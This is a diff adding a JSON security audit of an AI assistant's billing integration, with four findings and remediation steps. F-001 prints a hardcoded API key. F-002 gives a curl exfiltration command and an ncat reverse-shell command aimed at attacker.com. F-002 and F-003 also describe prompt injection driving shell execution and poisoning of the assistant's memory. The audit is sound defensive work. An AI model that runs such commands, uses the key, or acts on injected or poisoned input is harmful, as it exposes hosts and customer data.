@@ -1,0 +1,44 @@
+{
+  "findings": [
+    {
+      "id": "F-001",
+      "title": "Hardcoded API Key in Configuration File",
+      "file": "config/mcp.json",
+      "line": 6,
+      "severity": "Critical",
+      "impact": "Complete compromise of Acme Billing API authentication. Attacker with file access can extract the hardcoded BILLING_API_KEY (sk-acme-1f4d8e2b9c7a6d5e4f3b2a1c0d9e8f7a) and use it to perform unauthorized billing operations, access customer data, modify accounts, and commit financial fraud.",
+      "evidence": "The billing MCP server configuration contains a plain-text hardcoded API key in the environment variables: 'BILLING_API_KEY': 'sk-acme-1f4d8e2b9c7a6d5e4f3b2a1c0d9e8f7a'. This key is directly readable from the configuration file, version control history, or backups.",
+      "recommendation": "1. Immediately rotate the exposed API key through the Acme Billing API admin panel. 2. Move the BILLING_API_KEY to environment variables instead of hardcoding in config files. 3. Use a secrets management system (e.g., HashiCorp Vault, AWS Secrets Manager, or environment-based secrets). 4. Add config/mcp.json (or any file containing secrets) to .gitignore. 5. Scan git history and remove the exposed key from all previous commits using git-filter-branch or similar tools. 6. Implement pre-commit hooks to prevent credentials from being committed."
+    },
+    {
+      "id": "F-002",
+      "title": "Arbitrary Shell Command Execution from Model Output",
+      "file": "agent/answer.py",
+      "line": 48,
+      "severity": "Critical",
+      "impact": "Remote code execution (RCE) with the privileges of the process running the assistant. An attacker can execute arbitrary shell commands to exfiltrate sensitive data (including the hardcoded API key and memory files), install backdoors, modify system state, establish reverse shells, move laterally to other systems, or completely compromise the host.",
+      "evidence": "The summarize_and_run() function executes arbitrary strings as shell commands without validation: subprocess.run(model_output, shell=True, capture_output=True, text=True). The shell=True parameter enables metacharacter interpretation. Model output can be influenced through prompt injection by embedding malicious instructions in user input, or through MCP server compromise. Example malicious output: 'curl http://attacker.com -d @/var/lib/acme/agent-memory.json' or 'ncat -e /bin/bash attacker.com 4444'.",
+      "recommendation": "1. Remove the summarize_and_run() function entirely if not required. 2. If command execution is necessary, replace shell=True with shell=False and pass commands as a list to prevent metacharacter interpretation. 3. Implement strict allowlisting of permitted commands (whitelist approach). 4. Validate and sanitize all model output before command execution. 5. Use subprocess.run() with explicit command arguments rather than string templates. 6. Consider using shlex.split() if parsing strings is necessary. 7. Implement input validation on user queries to prevent prompt injection. 8. Add logging and monitoring for all command execution attempts."
+    },
+    {
+      "id": "F-003",
+      "title": "Unbounded Arbitrary Model Output Persistence in Memory",
+      "file": "agent/memory.py",
+      "line": 13,
+      "severity": "High",
+      "impact": "Multiple attack vectors: (1) Denial of Service via disk exhaustion - attacker repeatedly triggers the assistant causing large model outputs to accumulate unbounded in agent-memory.json until disk is full. (2) Memory poisoning - attacker crafts prompts to cause the model to 'remember' false information (e.g., 'User has premium tier', 'Payment of $1,000,000 received') that persists across sessions and influences future model behavior. (3) Sensitive data leakage - if the model is tricked into including API keys, credentials, or customer data in its output, these are persisted unencrypted in the world-readable JSON file.",
+      "evidence": "The remember_from_reply() function appends arbitrary model-generated strings directly to persistent storage without validation: data.setdefault('notes', []).append(reply). There are no size limits, content validation, deduplication, or quotas. The function is public and can be called repeatedly. The stored file /var/lib/acme/agent-memory.json is unencrypted plain JSON containing accumulated notes with no expiration.",
+      "recommendation": "1. Implement size limits and quotas on the notes array (e.g., max 100 notes or max 1MB total). 2. Add content validation and filtering before appending to memory. 3. Implement deduplication to prevent identical notes from being stored multiple times. 4. Add TTL (time-to-live) expiration for notes entries similar to preferences. 5. Implement per-session memory isolation if possible - only persist user preferences, not full conversation history. 6. Encrypt sensitive data at rest using fernet or AES encryption. 7. Add access controls and audit logging for memory operations. 8. Consider moving from JSON file to a proper database with access controls (SQLite, PostgreSQL) with encryption at rest."
+    },
+    {
+      "id": "F-004",
+      "title": "Unpinned NPM Package Version with Automatic Installation",
+      "file": "config/mcp.json",
+      "line": 5,
+      "severity": "Medium-High",
+      "impact": "Supply chain attack vector enabling arbitrary code execution. If the npm account for @acme/billing-mcp is compromised, an attacker can publish a malicious version that will be automatically pulled on next execution. The malicious code executes with full process privileges and has access to the hardcoded BILLING_API_KEY, system resources, and network access. Can be used to steal credentials, exfiltrate data, install persistence mechanisms, or achieve complete system compromise.",
+      "evidence": "The MCP configuration specifies '@acme/billing-mcp@latest' without version pinning, combined with the '-y' flag that automatically answers yes to prompts: 'command': 'npx', 'args': ['-y', '@acme/billing-mcp@latest']. This causes every execution to fetch the latest version from npm registry without human review. npm accounts have historically been compromised; typosquatting and dependency confusion attacks are documented threats.",
+      "recommendation": "1. Pin the npm package to a specific version: change '@acme/billing-mcp@latest' to '@acme/billing-mcp@X.Y.Z' (e.g., '@acme/billing-mcp@1.2.3'). 2. Remove the '-y' flag to require explicit user confirmation before installation. 3. Implement npm package integrity verification using package-lock.json or npm ci instead of npm install. 4. Use npm audit regularly to scan for known vulnerabilities in dependencies. 5. Consider using a private npm registry or mirror to control package sources. 6. Implement automated security scanning in CI/CD to detect compromised dependencies. 7. Monitor npm security advisories for @acme/billing-mcp and set up automated alerts."
+    }
+  ]
+}
